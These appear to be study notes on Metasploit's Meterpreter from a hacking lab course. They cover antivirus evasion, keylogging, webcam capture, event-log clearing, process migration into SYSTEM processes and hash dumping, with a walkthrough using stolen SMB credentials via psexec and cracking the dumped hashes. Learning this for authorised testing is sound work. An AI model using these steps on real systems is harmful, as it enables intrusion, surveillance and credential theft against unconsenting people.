Meterpreter runs only in memory to avoid disk antivirus scans
It also runs over encrypted traffic eg. HTTPS to avoid IPS and IDS, although most major antivirus can recognize meterpreter (establishes a TLS connection)
meterpreter > `getpid` -> `ps` shows that meterpreter runs under a cover name

`msfvenom -l payloads | grep meterpreter`, shows reverse and bind meterpreter shells on different platforms
Consider 3 factors when deciding which to use:
- Target OS (linux, windows, mac, android, etc.)
- Components available on the system (Python X.X, php website, etc.)
- Available connection types (raw TCP, HTTPS only, IPv6 vs IPv4?)

running `meterpreter > help' will yield different results on different versions (OS, components, connections)
Built-in commands
Meterpreter tools
Meterpreter scripting

Core commands:
background, exit
guid - get the session Globally Unique Identifier
info MODULE(?) - show info on a Post module
irb - interactive Ruby shell
load EXT - load meterpreter extension
migrate - migrates meterpreter to another process
run - execute script or post module

FIle system:
cd, ls, pwd, edit, cat, rm, search, upload, download

Networking:
arp - displays host ARP cache
ifconfig
netstat - display network connections
portfwd - forwards a local port to a remote service
route - view and modify routing table

System:
clearev - clear event logs
execute, getpid
getuid - shows the user that meterpreter is running as
kill, pkill - by number, by name
ps. reboot
shell - drops into system command shell
shutdown, sysinfo

Other:
idletime - number of seconds the remote user has been idle
keyscan_dump - dump keystroke buffer
keyscan_start, keyscan_stop
screenshare, screenshot
record_mic, webcam_list, webcam_snap
webcam_chat - starts video chat
webcam_stream: plays video stream from specified webcam
getsystem - attempts elevating privileges to local system
hashdump - dump content of the SAM (Security Account Manager) database stored in NTLM (New Tech LAN Manager) format

Example Post-Exploitation commands:
`help`
`meterpreter > getuid` -> `NT AUTHORITY\SYSTEM` = admin on windows
`ps` -> `migrate XXX` -> keyscan_start -> keyscan_stop -> keyscan_dump (migrate to word.exe to catch keystrokes)
`hashdump`
`search -f *flag*.txt`
`shell` -> CTRL-Z to return to meterpreter

Post-Exploitation Example:
Intent: gather further information about target system, find: files, user creds, network interfaces, privilege escalation, lateral movement
- given credentials, load up `use exploit/windows/smb/psexec` with msfconsole
- load RHOST, SMBUser and SMBPass 
- run, and get meterpreter shell
- use `sysinfo` to get computer name and domain name
- background sessions and use msfconsole to search a shares enumeration exploit
- use this exploit and `set SESSION 1` to attach to current meterpreter session
- shares are dumped
- try to get hashes with `hashdump` but it's unable to using our current foothold
- `ps` and find a process running as administrator 
**** admin migration should follow this priority: specific vulnerable admin procs, services.exe, wininit.exe, svchost.exe, lsm.exe, lsass.exe, and winlogon.exe
- `migrate PROCESS`, moves meterpreter session to system level
- `hashdump` and feed the hash into crackstation.net
- search for "secrets.txt" with `search -f *secrets.txt
- cat file location, use \ to precede spaces in file name, also use / for directories, instead of the displayed \ from windows
